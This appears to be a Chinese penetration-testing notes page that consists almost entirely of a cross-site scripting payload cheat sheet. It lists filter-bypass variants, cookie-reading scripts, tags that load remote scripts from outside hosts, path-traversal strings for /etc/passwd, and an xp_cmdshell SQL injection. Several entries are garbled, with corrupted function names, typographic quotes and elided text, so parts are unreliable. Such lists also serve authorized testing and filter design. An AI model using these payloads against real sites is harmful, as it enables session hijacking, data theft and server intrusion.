---
# 这是页面的图标
icon: script
# 这是文章的标题
title: XSS payload
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-18
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - XSS
comment: false
---

script、input中：

```jsx
' οninput=alert`1` //      当要在input中输入内容时触发事件
' οninput=alert`1` '       同上
' οnchange=alert`1` //  发生改变的时候触发该事件
' οnchange=alert`1` '   同上
```

```jsx
1)普通的XSS JavaScript注入
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

(2)IMG标签XSS使用JavaScript命令
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

(3)IMG标签无分号无引号
<IMG SRC=javascript:alert(‘XSS’)>

(4)IMG标签大小写不敏感
<IMG SRC=JaVaScRiPt:alert(‘XSS’)>

(5)HTML编码(必须有分号)
<IMG SRC=javascript:alert(“XSS”)>

(6)修正缺陷IMG标签
<IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>

(7)formCharCode标签(计算器)
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

(8)UTF-8的Unicode编码(计算器)
<IMG SRC=jav..省略..S')>

(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
<IMG SRC=jav..省略..S')>

(10)十六进制编码也是没有分号(计算器)
<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>

(11)嵌入式标签,将Javascript分开
<IMG SRC=”jav ascript:alert(‘XSS’);”>

(12)嵌入式编码标签,将Javascript分开
<IMG SRC=”jav ascript:alert(‘XSS’);”>

(13)嵌入式换行符
<IMG SRC=”jav ascript:alert(‘XSS’);”>

(14)嵌入式回车
<IMG SRC=”jav ascript:alert(‘XSS’);”>

(15)嵌入式多行注入JavaScript,这是XSS极端的例子
<IMG SRC=”javascript:alert(‘XSS‘)”>

(16)解决限制字符(要求同页面)
<script>z=’document.’</script>
<script>z=z+’write(“‘</script>
<script>z=z+’<script’</script>
<script>z=z+’ src=ht’</script>
<script>z=z+’tp://ww’</script>
<script>z=z+’w.shell’</script>
<script>z=z+’.net/1.’</script>
<script>z=z+’js></sc’</script>
<script>z=z+’ript>”)’</script>
<script>eval_r(z)</script>

(17)空字符
perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out

(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用
perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out

(19)Spaces和meta前的IMG标签
<IMG SRC=” javascript:alert(‘XSS’);”>

(20)Non-alpha-non-digit XSS
<SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”></SCRIPT>

(21)Non-alpha-non-digit XSS to 2
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

(22)Non-alpha-non-digit XSS to 3
<SCRIPT/SRC=”http://3w.org/XSS/xss.js”></SCRIPT>

(23)双开括号
<<SCRIPT>alert(“XSS”);//<</SCRIPT>

(24)无结束脚本标记(仅火狐等浏览器)
<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>

(25)无结束脚本标记2
<SCRIPT SRC=//3w.org/XSS/xss.js>

(26)半开的HTML/JavaScript XSS
<IMG SRC=”javascript:alert(‘XSS’)”

(27)双开角括号
<iframe src=http://3w.org/XSS.html <

(28)无单引号 双引号 分号
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>

(29)换码过滤的JavaScript
\”;alert(‘XSS’);//

(30)结束Title标签
</TITLE><SCRIPT>alert(“XSS”);</SCRIPT>

(31)Input Image
<INPUT SRC=”javascript:alert(‘XSS’);”>

(32)BODY Image
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>

(33)BODY标签
<BODY(‘XSS’)>

(34)IMG Dynsrc
<IMG DYNSRC=”javascript:alert(‘XSS’)”>

(35)IMG Lowsrc
<IMG LOWSRC=”javascript:alert(‘XSS’)”>

(36)BGSOUND
<BGSOUND SRC=”javascript:alert(‘XSS’);”>

(37)STYLE sheet
<LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>

(38)远程样式表
<LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>

(39)List-style-image(列表式)
<STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS

(40)IMG VBscript
<IMG SRC=’vbscript:msgbox(“XSS”)’></STYLE><UL><LI>XSS

(41)META链接url
<META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”>

(42)Iframe
<IFRAME SRC=”javascript:alert(‘XSS’);”></IFRAME>
(43)Frame
<FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>

(44)Table
<TABLE BACKGROUND=”javascript:alert(‘XSS’)”>

(45)TD
<TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>

(46)DIV background-image
<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>

(47)DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)
<DIV STYLE=”background-image: url( javascript:alert(‘XSS’))”>

(48)DIV expression
<DIV STYLE=”width: expression_r(alert(‘XSS’));”>

(49)STYLE属性分拆表达
<IMG STYLE=”xss:expression_r(alert(‘XSS’))”>

(50)匿名STYLE(组成:开角号和一个字母开头)
<XSS STYLE=”xss:expression_r(alert(‘XSS’))”>

(51)STYLE background-image
<STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A CLASS=XSS></A>

(52)IMG STYLE方式
exppression(alert(“XSS”))’>

(53)STYLE background
<STYLE><STYLE type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>

(54)BASE
<BASE HREF=”javascript:alert(‘XSS’);//”>

(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
<EMBED SRC=”http://3w.org/XSS/xss.swf” ></EMBED>

(56)在flash中使用ActionScrpt可以混进你XSS的代码
a=”get”;
b=”URL(\”";
c=”javascript:”;
d=”alert(‘XSS’);\”)”;
eval_r(a+b+c+d);

(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
<HTML xmlns:xss>
<?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”>
<xss:xss>XSS</xss:xss>
</HTML>

(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
<SCRIPT SRC=””></SCRIPT>

(59)IMG嵌入式命令,可执行任意命令
<IMG SRC=”http://www.XXX.com/a.php?a=b”>

(60)IMG嵌入式命令(a.jpg在同服务器)
Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser

(61)绕符号过滤
<SCRIPT a=”>” SRC=”http://3w.org/xss.js”></SCRIPT>

(62)
<SCRIPT =”>” SRC=”http://3w.org/xss.js”></SCRIPT>

(63)
<SCRIPT a=”>” ” SRC=”http://3w.org/xss.js”></SCRIPT>

(64)
<SCRIPT “a=’>’” SRC=”http://3w.org/xss.js”></SCRIPT>

(65)
<SCRIPT a=`>` SRC=”http://3w.org/xss.js”></SCRIPT>

(66)
<SCRIPT a=”>’>” SRC=”http://3w.org/xss.js”></SCRIPT>

(67)
<SCRIPT>document.write(“<SCRI”);</SCRIPT>PT SRC=”http://3w.org/xss.js”></SCRIPT>

(68)URL绕行
<A HREF=”http://127.0.0.1/”>XSS</A>

(69)URL编码
<A HREF=”http://3w.org”>XSS</A>

(70)IP十进制
<A HREF=”http://3232235521″>XSS</A>

(71)IP十六进制
<A HREF=”http://0xc0.0xa8.0×00.0×01″>XSS</A>

(72)IP八进制
<A HREF=”http://0300.0250.0000.0001″>XSS</A>

(73)混合编码
<A HREF=”h
tt p://6 6.000146.0×7.147/”">XSS</A>

(74)节省[http:]
<A HREF=”//www.google.com/”>XSS</A>

(75)节省[www]
<A HREF=”http://google.com/”>XSS</A>

(76)绝对点绝对DNS
<A HREF=”http://www.google.com./”>XSS</A>

(77)javascript链接
<A HREF=”javascript:document.location=’http://www.google.com/’”>XSS</A>
```

```jsx
1'"()&%<acx><ScRiPt >prompt(915149)</ScRiPt>

<svg/onload=alert(1)>

<script>alert(document.cookie)</script>

'><script>alert(document.cookie)</script>

='><script>alert(document.cookie)</script>

<script>alert(vulnerable)</script>

%3Cscript%3Ealert('XSS')%3C/script%3E

<script>alert('XSS')</script>

<img src="javascript:alert('XSS')">

%0a%0a<script>alert(\"Vulnerable\")</script>.jsp

%22%3cscript%3ealert(%22xss%22)%3c/script%3e

%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini

%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e

%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e

%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html

<script>alert('Vulnerable');</script>

<script>alert('Vulnerable')</script>

a.jsp/<script>alert('Vulnerable')</script>

a?<script>alert('Vulnerable')</script>

"><script>alert('Vulnerable')</script>

';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&&

%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

%3Cscript%3Ealert(document. domain);%3C/script%3E&

%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=

<IMG src="javascript:alert('XSS');">

<IMG src=javascript:alert('XSS')>

<IMG src=JaVaScRiPt:alert('XSS')>

<IMG src=JaVaScRiPt:alert("XSS")>

<IMG src=javascript:alert('XSS')>

<IMG src=javascript:alert('XSS')>

<IMG src=javascript:alert('XSS')>

<IMG src="jav ascript:alert('XSS');">

<IMG src="jav ascript:alert('XSS');">

<IMG src="jav ascript:alert('XSS');">

"<IMG src=java\0script:alert(\"XSS\")>";' > out

<IMG src=" javascript:alert('XSS');">

<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>

<BODY BACKGROUND="javascript:alert('XSS')">

<BODY ONLOAD=alert('XSS')>

<IMG DYNSRC="javascript:alert('XSS')">

<IMG LOWSRC="javascript:alert('XSS')">

<BGSOUND src="javascript:alert('XSS');">

<br size="&{alert('XSS')}">

<LAYER src="http://xss.ha.ckers.org/a.js"></layer>

<LINK REL="stylesheet" href="javascript:alert('XSS');">

<IMG src='vbscript:msgbox("XSS")'>

<IMG src="mocha:[code]">

<IMG src="livescript:[code]">

<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

<IFRAME src=javascript:alert('XSS')></IFRAME>

<FRAMESET><FRAME src=javascript:alert('XSS')></FRAME></FRAMESET>

<TABLE BACKGROUND="javascript:alert('XSS')">

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');">

<DIV STYLE="width: expression(alert('XSS'));">

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<IMG STYLE='xss:expre\ssion(alert("XSS"))'>

<STYLE TYPE="text/javascript">alert('XSS');</STYLE>

<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A class="XSS"></A>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<BASE href="javascript:alert('XSS');//">

getURL("javascript:alert('XSS')")

a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);

<XML src="javascript:alert('XSS');">

"> <BODY><SCRIPT>function a(){alert('XSS');}</SCRIPT><"

<SCRIPT src="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>

<IMG src="javascript:alert('XSS')"

<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo
'=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->

<IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">

<SCRIPT a=">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT =">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT a=">" '' src="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT "a='>'" src="http://xss.ha.ckers.org/a.js"></SCRIPT>

<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://xss.ha.ckers.org/a.js"></SCRIPT>

<A href=http://www.gohttp://www.google.com/ogle.com/>link</A>

<IMG SRC=javascript:alert(‘XSS’)>

<IMG SRC=# onmouseover=”alert(‘xxs’)”>

<IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”></img>

<img src=x onerror=”&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041″>

<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;

&#39;&#88;&#83;&#83;&#39;&#41;>

<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

<IMG SRC=”jav ascript:alert(‘XSS’);”>

<IMG SRC=”jav&#x0A;ascript:alert(‘XSS’);”>

<IMG SRC=” &#14;  javascript:alert(‘XSS’);”>

<<SCRIPT>alert(“XSS”);//<</SCRIPT>

<IMG SRC=”javascript:alert(‘XSS’)”

</script><script>alert(‘XSS’);</script>

<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>

<BODY BACKGROUND=”javascript:alert(‘XSS’)”>

<svg/onload=alert('XSS')>

<IMG SRC=’vbscript:msgbox(“XSS”)’>

<BGSOUND SRC="javascript:alert('XSS');">

<BR SIZE="&{alert('XSS')}">

<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">

<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<XSS STYLE="behavior: url(xss.htc);">

<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>

<TABLE><TD BACKGROUND="javascript:alert('XSS')">

<DIV STYLE="width: expression(alert('XSS'));">

<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>

<script>alert(/xss/)</script>

<svg onload=alert(document.domain)>

<img src=document.domain onerror=alert(document.domain)>

<M onmouseover=alert(document.domain)>M

<marquee onscroll=alert(document.domain)>

<a href=javascript:alert(document.domain)>M</a>

<body onload=alert(document.domain)>

<details open ontoggle=alert(document.domain)>

<embed src=javascript:alert(document.domain)>

<script>alert(1)</script>

<sCrIpT>alert(1)</sCrIpT>

<ScRiPt>alert(1)</ScRiPt>

<sCrIpT>alert(1)</ScRiPt>

<ScRiPt>alert(1)</sCrIpT>

<img src=1 onerror=alert(1)>

<iMg src=1 oNeRrOr=alert(1)>

<ImG src=1 OnErRoR=alert(1)>

<img src=1 onerror="alert(&quot;M&quot;)">

<marquee onscroll=alert(1)>

<mArQuEe OnScRoLl=alert(1)>

<MaRqUeE oNsCrOlL=alert(1)>

<a href=javascript:/0/,alert(%22M%22)>M</a>

<a href=javascript:/00/,alert(%22M%22)>M</a>

<a href=javascript:/000/,alert(%22M%22)>M</a>

<a href=javascript:/M/,alert(%22M%22)>M</a>

<base href=javascript:/M/><a href=,alert(1)>M</a>

<base href=javascript:/M/><iframe src=,alert(1)></iframe>

</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>

"><img src=x onerror=alert(document.cookie)>.gif

<div style="background-image:url(javascript:alert(/xss/))">

<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>

<iframe src=javascript:alert(1)></iframe>

<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>

<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>

<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>

<iframe src=https://baidu.com width=1366 height=768></iframe>

<iframe src=javascript:alert(1) width=1366 height=768></iframe

<form action=javascript:alert(1)><input type=submit>

<form><button formaction=javascript:alert(1)>M

<form><input formaction=javascript:alert(1) type=submit value=M>

<form><input formaction=javascript:alert(1) type=image value=M>

<form><input formaction=javascript:alert(1) type=image src=1>

<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
```
